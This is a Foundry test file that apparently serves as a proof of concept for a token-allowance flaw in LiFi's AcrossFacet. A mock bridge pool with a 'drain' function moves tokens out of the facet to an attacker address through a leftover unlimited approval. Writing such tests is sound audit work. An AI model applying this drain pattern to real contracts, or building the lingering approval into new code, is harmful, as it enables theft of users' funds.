pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {AcrossFacet} from "lifi/Facets/AcrossFacet.sol";
import {IAcrossSpokePool} from "lifi/Interfaces/IAcrossSpokePool.sol";
import {ILiFi} from "lifi/Interfaces/ILiFi.sol";

contract MockSpokePool is IAcrossSpokePool {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function deposit(
        address,
        address originToken,
        uint256 amount,
        uint256,
        int64,
        uint32,
        bytes memory,
        uint256
    ) external payable override {
        // simulate bridge pulling tokens
        MockERC20(originToken).transferFrom(msg.sender, address(this), amount);
    }

    function depositV3(
        address,
        address,
        address,
        address,
        uint256,
        uint256,
        uint256,
        address,
        uint32,
        uint32,
        uint32,
        bytes calldata
    ) external payable override {}

    function drain(address from, address to, uint256 amount) external {
        MockERC20(token).transferFrom(from, to, amount);
    }
}

contract AcrossFacetAllowanceTest is Test {
    MockERC20 internal token;
    MockSpokePool internal pool;
    AcrossFacet internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        pool = new MockSpokePool(address(token));
        facet = new AcrossFacet(IAcrossSpokePool(address(pool)), address(1));

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        ILiFi.BridgeData memory bridgeData = ILiFi.BridgeData({
            transactionId: bytes32("tx"),
            bridge: "",
            integrator: "",
            referrer: address(0),
            sendingAssetId: address(token),
            receiver: address(0x1234),
            minAmount: 10 ether,
            destinationChainId: 2,
            hasSourceSwaps: false,
            hasDestinationCall: false
        });

        AcrossFacet.AcrossData memory aData = AcrossFacet.AcrossData({
            relayerFeePct: 0,
            quoteTimestamp: 0,
            message: "",
            maxCount: 0
        });

        facet.startBridgeTokensViaAcross(bridgeData, aData);

        // allowance remains set after bridging
        assertEq(
            token.allowance(address(facet), address(pool)),
            type(uint256).max
        );

        // attacker sends tokens to facet and pool drains them
        token.mint(address(facet), 5 ether);
        pool.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}

